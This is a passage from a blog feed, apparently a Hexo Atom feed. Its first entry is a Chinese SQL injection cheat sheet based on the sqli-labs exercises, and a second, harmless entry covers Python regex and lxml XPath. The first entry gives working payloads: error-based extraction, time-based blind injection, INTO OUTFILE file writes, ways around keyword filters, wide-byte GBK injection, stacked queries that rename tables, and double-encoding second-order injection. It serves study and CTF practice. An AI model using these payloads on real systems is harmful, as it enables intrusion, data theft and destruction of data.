extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span></span><br><span class="line"><span class="string">updatexml</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">利用数据重复性</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x#</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">延时注入</span><br><span class="line">利用sleep()函数进行注入</span><br><span class="line">?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">#(若有错误时有5秒时间延时)</span></span><br><span class="line">利用benchmark()进行延时注入</span><br><span class="line">?id=1' union <span class="keyword">select</span>(<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="keyword">by</span> <span class="number">5</span> <span class="keyword">seconds</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>)<span class="keyword">as</span> tb1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="3-导入导出"><a href="#3-导入导出" class="headerlink" title="3.导入导出"></a>3.导入导出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\wamp\\www\\sqllib\\Less-7\\uuu.txt"</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p><p><strong>stripslashes()</strong> 函数删除由 addslashes() 函数添加的反斜杠</p><p><strong>mysql_real_escape_string()</strong> 函数转义 SQL 语句中使用的字符串中的特殊字符</p><p>如何绕过or和and过滤：</p><p>1.大小写变形 Or,OR,oR</p><p>2.编码，hex，urlencode</p><p>3.添加注释/<em>or</em>/</p><p>4.利用符号 and=&amp;&amp; or=||</p><p>%09 TAB键（水平） </p><p>%0a 新建一行 </p><p>%0c 新的一页 </p><p>%0d return功能 </p><p>%0b TAB键（垂直） </p><p>%a0 空格 </p><h4 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4.宽字节注入"></a>4.宽字节注入</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ' 的时候，往往利用的思路是将 ' 转换为 \' </span><br><span class="line"></span><br><span class="line"> 1.%df吃掉 \ 具体的原因是urlencode('\) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br><span class="line"> 2.将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</span><br></pre></td></tr></table></figure><h4 id="5-堆叠注入"><a href="#5-堆叠注入" class="headerlink" title="5.堆叠注入"></a>5.堆叠注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);过滤了括号内的东西</span></span><br><span class="line"><span class="string">?a=1#返回正常</span></span><br><span class="line"><span class="string">堆叠查询 id=1';show databases;'爆出数据库内容</span></span><br><span class="line"><span class="string">id=1';show tables;'爆出所有表名</span></span><br><span class="line"><span class="string">/?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串</span></span><br></pre></td></tr></table></figure><h4 id="6-二次注入"><a href="#6-二次注入" class="headerlink" title="6.二次注入"></a>6.二次注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.php?id=%2527,第一次解码的结果为id=1%27,%25解码为%,如果使用了urldecode或者rawurldecode来解码id参数，结果为id=1'单引号成功出现引发注入.</span><br></pre></td></tr></table></figure><p>用hex先将字符转换成16进制，然后用CONV函数将16进制转化为10进制</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据sqli-labs上的教学做了一个sql用法的总结&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="sql总结" scheme="http://yoursite.com/tags/sql%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>爬虫</title>
    <link href="http://yoursite.com/2020/01/13/%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2020/01/13/%E7%88%AC%E8%99%AB/</id>
    <published>2020-01-13T05:55:58.000Z</published>
    <updated>2020-01-15T02:42:29.675Z</updated>
    
    <content type="html"><![CDATA[<h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p>import re<a id="more"></a></p><h4 id="匹配任意字符除了换行符"><a href="#匹配任意字符除了换行符" class="headerlink" title=". 匹配任意字符除了换行符"></a>. 匹配任意字符除了换行符</h4><p>[…] 匹配字符集<br>\d/\D 匹配数字/非数字<br>\s/\S 匹配空白/非空白字符<br>\w/\W匹配单词字符[a-zA-Z0-9]/非单词字符</p><p>*匹配前一个字符0次或者无限次</p><p>+匹配前一个字符1次或者无限次<br>？ 匹配前一个字符0次或者1次<br>{m}/{m,n}匹配前一个字符m次或者n次<br>*? /+? /??匹配模式变为非贪婪<br>^匹配字符串开头<br>$匹配字符串结尾<br>\A/\Z指定的字符串匹配必须出现在开头/结尾</p><h4 id="匹配方式"><a href="#匹配方式" class="headerlink" title="匹配方式:"></a>匹配方式:</h4><p>match方法从开头开始匹配内容，失败返回None<br>search扫描整个匹配内容返回第一个成功的匹配<br>compile编译一个正则表达式<br>findall找到所有匹配的子串，并返回一个列表，未找到则返回空列表<br>sub(正则表达式，替换内容，替换目标)<br>spilt(res，a)分割</p><h3 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h3><h4 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h4><p>1.安装 pip install lxml<br>2.语法<br>(1)选取节点：<br>nodename  选取此节点的所有子节点<br>/         从根节点选取<br>//          从匹配选择的当前节点选择文档中的节点，不考虑位置‘<br>.          选取当前节点<br>..          选取当前节点的父节点<br>@          选取属性<br>(2)谓语<br>//title[@lang]    选取所有拥有名为 lang 的属性的 title 元素<br>//title[@lang=’eng’]    选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性<br>(3)选取未知节点</p><p>‘*’匹配任何元素节点<br>@”星号”    匹配任何属性节点<br>node()    匹配任何类型的节点</p><p>lxml主要是为了用来解析html，作用和正则匹配差不多，但是使用起来会更加方便</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;re模块&quot;&gt;&lt;a href=&quot;#re模块&quot; class=&quot;headerlink&quot; title=&quot;re模块&quot;&gt;&lt;/a&gt;re模块&lt;/h3&gt;&lt;p&gt;import re
    
    </summary>
    
    
    
      <category term="climb" scheme="http://yoursite.com/tags/climb/"/>
    
  </entry>
  
</feed>
